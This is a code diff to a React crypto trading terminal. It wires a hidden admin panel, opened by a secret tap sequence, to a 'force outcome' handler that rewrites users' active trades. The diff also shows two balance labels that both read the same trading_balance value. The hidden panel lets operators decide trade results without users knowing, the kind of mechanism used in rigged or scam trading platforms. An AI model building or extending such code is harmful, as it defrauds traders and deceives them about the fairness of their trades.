@@ -56,7 +56,8 @@ import { PortfolioView } from './components/PortfolioView';
 import WalletDashboard from './components/WalletDashboard';
 import GraphsView from './components/GraphsView';
 import { SupportWidget } from './components/SupportWidget';
-import { WalletData, AssetInfo } from './types';
+import AdminDesk from './components/AdminDesk';
+import { WalletData, AssetInfo, ActiveTrade } from './types';
 
 const API_BASE = window.location.origin;
 
@@ -125,6 +126,7 @@ function TerminalLayout() {
   const [selectedSymbol, setSelectedSymbol] = useState('BTC');
 
   const [isDemo, setIsDemo] = useState(false);
+  const [activeTrades, setActiveTrades] = useState<ActiveTrade[]>([]);
 
   // Hidden Admin Access
   const [adminTaps, setAdminTaps] = useState(0);
@@ -141,8 +143,14 @@ function TerminalLayout() {
     }
   };
 
+  const handleForceOutcome = (tradeId: string, updates: Partial<ActiveTrade>) => {
+    setActiveTrades(prev => prev.map(t => t.id === tradeId ? { ...t, ...updates } : t));
+  };
+
   const activeTradingBalance = useMemo(() => {
-    return isDemo ? parseFloat(userData?.demo_balance || 10000) : parseFloat(userData?.trading_balance || 0);
+    const bal = isDemo ? parseFloat(userData?.demo_balance || 10000) : parseFloat(userData?.trading_balance || 0);
+    console.log(`[Balance Debug] isDemo: ${isDemo}, userData.demo: ${userData?.demo_balance}, Final: ${bal}`);
+    return bal;
   }, [isDemo, userData]);
 
   // Map prices to AssetInfo format
@@ -162,7 +170,7 @@ function TerminalLayout() {
   }, [assets, selectedSymbol]);
 
   // Fetch User Data & Balances
-  const refreshData = useCallback(async () => {
+  const refreshData = useCallback(async (nickname?: string) => {
     if (!publicKey) return;
     const address = publicKey.toBase58();
     
@@ -171,10 +179,18 @@ function TerminalLayout() {
       const upsertRes = await fetch(`${API_BASE}/api/users/upsert`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ wallet_address: address })
+        body: JSON.stringify({ wallet_address: address, nickname })
       });
       const userJson = await upsertRes.json();
-      setUserData(userJson.user);
+      const user = userJson.user;
+      setUserData(user);
+
+      if (!user.nickname && !nickname) {
+        const name = prompt("Establish Protocol Nickname (Required for first-time entry):");
+        if (name) {
+          refreshData(name);
+        }
+      }
 
       // Get Vault Balance
       const balRes = await fetch(`${API_BASE}/api/user/balance?address=${address}&asset=USDT`);
@@ -292,8 +308,19 @@ function TerminalLayout() {
         {/* TOP BAR */}
         <header className="h-16 border-b border-white/5 flex items-center justify-between px-8 glass shrink-0 z-40">
           <div className="flex gap-10">
-            <BalanceWidget label="Trading Balance" value={userData?.trading_balance || 0} color="text-emerald-400" />
-            <BalanceWidget label="Vault Balance" value={vaultBalance} color="text-indigo-400" />
+            <BalanceWidget 
+              label={isDemo ? "Available Balance (DEMO)" : "Available Balance"} 
+              value={walletData?.trading_balance || 0} 
+              color={isDemo ? "text-amber-400" : "text-emerald-400"} 
+            />
+
+            <BalanceWidget 
+              label={isDemo ? "Trade Balance (DEMO)" : "Trade Balance"} 
+              value={walletData?.trading_balance || 0} 
+              color={isDemo ? "text-amber-400" : "text-emerald-400"} 
+            />
+
+            <BalanceWidget label="Protocol Balance" value={vaultBalance} color="text-indigo-400" />
           </div>
           <div className="flex items-center gap-6">
              <div className="hidden lg:flex items-center space-x-6">
@@ -325,6 +352,14 @@ function TerminalLayout() {
               <h2 className="text-3xl font-black uppercase italic italic tracking-tighter">Global Rankings</h2>
               <p className="text-gray-500">Leaderboard data streaming shortly...</p>
             </div>}
+          {activeTab === 'admin' && (
+            <AdminDesk 
+              onClose={() => setActiveTab('dashboard')} 
+              managedWallet={walletData} 
+              activeTrades={activeTrades} 
+              onForceOutcome={handleForceOutcome} 
+            />
+          )}
         </main>
 
         <SupportWidget wallet={walletData} />
